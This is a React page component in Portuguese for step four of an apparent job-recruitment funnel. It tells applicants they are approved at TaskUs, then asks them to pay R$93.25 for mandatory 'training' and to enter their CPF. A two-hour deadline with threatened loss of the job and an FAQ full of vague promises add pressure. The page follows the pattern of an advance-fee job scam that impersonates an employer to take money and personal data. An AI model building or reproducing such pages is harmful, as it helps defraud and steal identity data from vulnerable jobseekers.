/* eslint-disable no-unused-vars */

import { useEffect, useState } from 'react';
import { motion } from 'framer-motion';
import Maintexts from "../../modules/Main-texts";
import Headlines from "../../modules/Headlines";
import Paragraphs from "../../modules/Paragraphs";
import ExplanatoryCards from "../../modules/ExplanatoryCards";
import { IconAlert } from "../../modules/SvgIcons";

const ReviewStep4Contratacao = ({ onContinue }) => {
  const [isLoading, setIsLoading] = useState(false);
  const [openFaq, setOpenFaq] = useState(null);

  const handleContinue = () => {
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      if (onContinue) onContinue();
    }, 1000);
  };

  // ===== Card informativo
  const supportTypes = [
    {
      id: "training-why-pay",
      icon: () => (
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="36"
          height="36"
          viewBox="0 0 24 24"
          fill="none"
          stroke="#1655ff"
          strokeLinecap="round"
          strokeLinejoin="round"
          strokeWidth="1.5"
        >
          <path d="M13.466 4.022C15.97 4.022 18 6.035 18 8.517s-2.03 4.494-4.534 4.494a4.53 4.53 0 0 1-4.46-3.675m12.992 4.674h-2.393c-.294 0-.584.066-.847.193l-2.04.987a1.95 1.95 0 0 1-.847.193h-1.042c-1.008 0-1.825.79-1.825 1.765c0 .04.027.074.067.085l2.539.701c.455.126.943.082 1.367-.123l2.18-1.054m-6.152-.25l-4.59-1.41a1.98 1.98 0 0 0-2.202.753c-.369.51-.219 1.24.318 1.55l7.51 4.33a2 2 0 0 0 1.566.187l6.39-1.895" />
          <path d="M2.002 4.52c1.527-.598 3.7-2.056 4.888-2.355c2.633-.529 4.014.25 7.132 1.858c-1.312.028-3.076.779-3.944 2.494m0 0H8.294m1.784 0h1.309c.393.03 1.242.266 1.569 1.027c.13.306.168.668-.09.852c-.347.358-.845.344-1.287.422m0 0c-.508.09-.997.19-1.508.29m1.508-.29l-1.508.29m0 0l-.342.065m.342-.065l-.342.065m0 0c-.797.09-2.739 1.018-3.685 1.279c-.322.153-2.903.654-4.028.566" />
        </svg>
      ),
      title: "Por que é preciso pagar?",
      description:
        "Esse valor confirma seu compromisso com a vaga. Ao investir, você demonstra responsabilidade e mantém sua vaga reservada — evitando que seja repassada a alguém da lista de espera.",
    },
  ];

  // ===== Alerta
  const alerts = [
    {
      id: 'equipments-alert',
      icon: IconAlert,
      title: 'Atenção',
      description:
        'Caso você não inicie o treinamento nas próximas 2 horas, você perderá o emprego e sua vaga será repassada a outra pessoa. Clique agora em "Iniciar Treinamento".'
    }
  ];

  // ===== FAQ (importado do Step2)
  const faqList = [
    {
      question: "Enviar os seus acessos do sistema",
      answer:
        "Você receberá seus acessos por e-mail após a conclusão do treinamento. Caso não receba, entre em contato com o gerente.",
    },
    {
      question: "Como agendar minha data de início?",
      answer:
        "O gerente entrará em contato pelo WhatsApp para agendar sua data de início após o treinamento.",
    },
    {
      question: "Como assinar minha carteira de trabalho?",
      answer:
        "A assinatura será feita digitalmente após a conclusão do treinamento e envio dos documentos.",
    },
    {
      question: "Quando recebo os equipamentos?",
      answer:
        "O envio dos equipamentos será iniciado após a confirmação da contratação e treinamento.",
    },
    {
      question: "Quem será meu gerente?",
      answer:
        "Você será apresentado ao gerente responsável assim que concluir o treinamento.",
    },
    {
      question: "Como acessar o sistema?",
      answer:
        "Os acessos serão enviados por e-mail e WhatsApp após o treinamento.",
    },
    {
      question: "Posso tirar dúvidas com o gerente?",
      answer:
        "Sim! O gerente estará disponível para tirar dúvidas pelo WhatsApp após o treinamento.",
    },
  ];

  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, []);

  return (
    <div className="min-h-screen w-full flex flex-col items-center justify-start bg-[#0a0026] px-6 pb-10">
      <div className="w-full max-w-md mx-auto px-0 pt-8 pb-0">

        <Maintexts>
          <Headlines variant="white">
            Treinamento em<br />atendimento ao cliente
          </Headlines>
          <Paragraphs variant="white">
            Sua vaga já está garantida, agora você será direcionado(a) para a Q3 EAD para iniciar o treinamento e poder começar a trabalhar.
          </Paragraphs>
        </Maintexts>

        {/* Card de valores */}
        <div
          className="bg-[#f2f6f9] rounded-2xl px-7 pt-8 pb-7 mb-6 flex flex-col"
          style={{ boxShadow: '0 2px 8px 0 rgba(22,85,255,0.08)' }}
        >
          <div className="flex flex-col items-start mb-4">
            <span className="block mb-2" style={{ lineHeight: 1 }}>
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="54"
                height="54"
                viewBox="0 0 24 24"
                fill="none"
                stroke="#1655ff"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="1.5"
              >
                <g>
                  <path d="M16.308 4.384c-.59 0-.886 0-1.155-.1l-.111-.046c-.261-.12-.47-.328-.888-.746c-.962-.962-1.443-1.443-2.034-1.488a2 2 0 0 0-.24 0c-.591.045-1.072.526-2.034 1.488c-.418.418-.627.627-.888.746l-.11.046c-.27.1-.565.1-1.156.1h-.11c-1.507 0-2.261 0-2.73.468s-.468 1.223-.468 2.73v.11c0 .59 0 .886-.1 1.155q-.022.057-.046.111c-.12.261-.328.47-.746.888c-.962.962-1.443 1.443-1.488 2.034a2 2 0 0 0 0 .24c.045.591.526 1.072 1.488 2.034c.418.418.627.627.746.888q.025.054.046.11c.1.27.1.565.1 1.156v.11c0 1.507 0 2.261.468 2.73s1.223.468 2.73.468h.11c.59 0 .886 0 1.155.1q.057.021.111.046c.261.12.47.328.888.746c.962.962 1.443 1.443 2.034 1.488q.12.009.24 0c.591-.045 1.072-.526 2.034-1.488c.418-.418.627-.626.888-.746q.054-.025.11-.046c.27-.1.565-.1 1.156-.1h.11c1.507 0 2.261 0 2.73-.468s.468-1.223.468-2.73v-.11c0-.59 0-.886.1-1.155q.021-.057.046-.111c.12-.261.328-.47.746-.888c.962-.962 1.443-1.443 1.488-2.034q.009-.12 0-.24c-.045-.591-.526-1.072-1.488-2.034c-.418-.418-.626-.627-.746-.888l-.046-.11c-.1-.27-.1-.565-.1-1.156v-.11c0-1.507 0-2.261-.468-2.73s-1.223-.468-2.73-.468z" />
                  <path d="M8.5 16.5a4.04 4.04 0 0 1 3.5-2.02c1.496 0 2.801.812 3.5 2.02M14 10a2 2 0 1 1-4 0a2 2 0 0 1 4 0" />
                </g>
              </svg>
            </span>
            <span className="font-hendrix-regular text-black text-[18px] leading-tight mb-2" style={{ maxWidth: '100%' }}>
              O treinamento completo inclui todos os materiais de estudo e a emissão da certificação reconhecida. O valor total é de R$680,00, definido pela Q3 EAD.
              <br /><br />
              Como você já foi aprovado para ser contratado(a), a TaskUs cobre R$586,75 desse valor, ficando para você R$93,25.
            </span>
          </div>

          {/* Faixas de valores */}
          <div
            className="flex flex-col border border-black w-full rounded-[2.5vw] overflow-hidden mb-4"
            style={{ boxShadow: '0 1px 4px 0 rgba(22,85,255,0.04)' }}
          >
            <div className="flex justify-between items-center border border-b-black px-5 py-3">
              <span className="font-hendrix-regular text-black text-[14px]">Valor total</span>
              <span className="font-hendrix-bold text-black text-[16px]">R$680,00</span>
            </div>
            <div className="flex justify-between items-center px-5 py-3">
              <span className="font-hendrix-regular text-black text-[14px]">Pago por nós</span>
              <span className="font-hendrix-bold text-[#FF5A5A] text-[16px]">- R$586,75</span>
            </div>
            <div className="flex justify-between items-center border border-t-black px-5 py-3">
              <span className="font-hendrix-regular text-black text-[14px]">Seu investimento</span>
              <span className="font-hendrix-bold text-[#2c6dfa] text-[16px]">R$93,25</span>
            </div>
          </div>

          <div className="font-hendrix-regular leading-[17px] text-[#B3B3B3] text-[14px] mt-2">
            Para garantir o valor pago pela TaskUs é necessário digitar o seu CPF ao entrar na Q3 EAD.
          </div>
        </div>

        {/* Card informativo */}
        <div className="mt-5">
          <ExplanatoryCards supportTypes={supportTypes} variant="supportTypes" />
        </div>

        {/* Alerta */}
        <div className="mt-4">
          <ExplanatoryCards supportTypes={alerts} variant="alert" />
        </div>

        {/* Botão principal */}
        <div className="w-full pt-2 mt-10 mb-10 pb-6 flex justify-center">
          <motion.button
            onClick={handleContinue}
            disabled={isLoading}
            whileTap={{ scale: 0.97 }}
            whileHover={{ scale: isLoading ? 1 : 1.03 }}
            className={`w-full flex items-center justify-center gap-2 px-6 py-4 rounded-full font-hendrix-medium text-white shadow-md focus:outline-none focus:ring-2 focus:ring-[#1655ff] transition-all duration-300 ${isLoading ? 'opacity-60 cursor-not-allowed' : ''}`}
            style={{
              background: 'linear-gradient(90deg, #1655ff 0%, #4285f4 100%)',
              fontSize: '15pt',
              boxShadow: '0 2px 8px 0 rgba(22,85,255,0.10)',
              border: 'none',
              opacity: isLoading ? 0.7 : 1
            }}
          >
            {isLoading ? (
              <>
                <motion.div
                  className="w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"
                  animate={{ rotate: 360 }}
                  transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
                  style={{ borderTopColor: 'transparent', borderRightColor: 'white', borderBottomColor: 'white', borderLeftColor: 'white' }}
                />
                <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '13pt' }}>Carregando...</span>
              </>
            ) : (
              <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '15pt' }}>Iniciar treinamento</span>
            )}
          </motion.button>
        </div>

        {/* FAQ abaixo do botão */}
        <div className="w-full mt-2">
          <h2 className="font-hendrix-bold text-white text-[28px] mb-1 text-left">
            Dúvidas frequentes
          </h2>
          <p className="font-hendrix-regular text-[#B3B3B3] text-[18px] mb-6 text-left">
            Você tem alguma dúvida? Talvez isso possa te ajudar!
          </p>
          <div className="flex flex-col gap-4">
            {faqList.map((faq, idx) => (
              <div
                key={idx}
                className="bg-[#232323] rounded-2xl px-7 py-4 flex flex-col transition-all duration-300"
                style={{ boxShadow: '0 2px 8px 0 rgba(22,85,255,0.08)' }}
              >
                <button
                  className="w-full flex items-center justify-between focus:outline-none"
                  style={{ minHeight: "48px" }}
                  onClick={() => setOpenFaq(openFaq === idx ? null : idx)}
                >
                  <span className="font-hendrix-regular text-[#B3B3B3] text-[18px]">
                    {faq.question}
                  </span>
                  <span className="ml-2">
                    {openFaq === idx ? (
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                        <path
                          d="M6 15l6-6 6 6"
                          stroke="#1655ff"
                          strokeWidth="2.5"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        />
                      </svg>
                    ) : (
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                        <path
                          d="M12 6v12M6 12h12"
                          stroke="#1655ff"
                          strokeWidth="2.5"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        />
                      </svg>
                    )}
                  </span>
                </button>
                {openFaq === idx && (
                  <div className="font-hendrix-regular text-[#B3B3B3] text-[16px] mt-3 text-left transition-all duration-300">
                    {faq.answer}
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
};

export default ReviewStep4Contratacao;